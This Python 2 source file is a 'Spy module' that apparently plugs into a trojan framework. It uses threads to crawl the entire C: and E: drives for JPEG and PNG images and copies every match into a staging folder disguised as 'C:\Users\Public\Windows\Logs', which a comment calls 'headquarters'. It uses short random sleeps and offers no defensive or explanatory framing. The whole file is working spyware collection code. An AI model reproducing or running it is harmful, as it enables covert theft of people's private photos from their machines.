import os
import shutil
import fnmatch
import threading
import Queue
import time
import random


path_queue = Queue.Queue()
info_station = r'C:\Users\Public\Windows\Logs'


def crawl_disk(disk, doc_type):
    # Crawl one disk to find suitable file's types
    for parent, directories, filenames in os.walk(disk):
        for extentions in doc_type:
            for filename in fnmatch.filter(filenames, "*%s" % extentions):
                doc_path = os.path.join(parent, filename)
                path_queue.put(doc_path)

    print "Finish with disk %s" % disk
    time.sleep(random.uniform(0.01, 0.1))


def replicate(q):
    
    while not q.empty():
        
        info_path = q.get()
        try:
            shutil.copy2(info_path, info_station)
        except Exception as err:
            print err
        
        q.task_done()

    time.sleep(random.uniform(0.01,0.02))
    
    return True


def run(**args):

    print "[*] In Spy module."
    disk1 = "C:\\"
    disk2 = "E:\\"
    doc_type = ['.jpeg', '.jpg', '.png']

    # Start multiple thread-scanners running simultaneously
    scanner1 = threading.Thread(target=crawl_disk, args=(disk1, doc_type,))
    scanner1.start()
    scanner2 = threading.Thread(target=crawl_disk, args=(disk2, doc_type,))
    scanner2.start()
    scanner1.join()
    scanner2.join()
    # Start copying files, located by file paths gathered from scanners, to headquarters
    copier = threading.Thread(target=replicate, args=(path_queue,))
    copier.start()
    copier.join()

    return
